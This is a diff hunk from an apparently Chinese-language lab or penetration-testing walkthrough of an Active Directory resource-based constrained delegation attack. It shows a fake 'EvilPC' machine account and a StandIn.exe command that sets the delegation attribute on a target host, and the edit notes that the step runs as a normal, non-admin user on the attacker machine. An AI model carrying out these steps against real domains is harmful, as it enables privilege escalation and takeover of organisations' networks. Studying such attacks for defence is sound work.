@@ -71,7 +71,7 @@ New-ADComputer -Name "EvilPC" -SamAccountName "EvilPC$" -Path "CN=Computers,DC=s
 ## 步驟 4: 配置 RBCD
 
 ### 4.1 設置 RBCD 屬性
-```powershell
+```powershell: 在attacker 上在一般權限執行，非Administrator
 .\StandIn.exe --computer EC2AMAZ-V903HM1 --sid <EVILPC_SID>
 # 範例: .\StandIn.exe --computer EC2AMAZ-V903HM1 --sid S-1-5-21-807542958-1552376634-887055384-1144
 ```
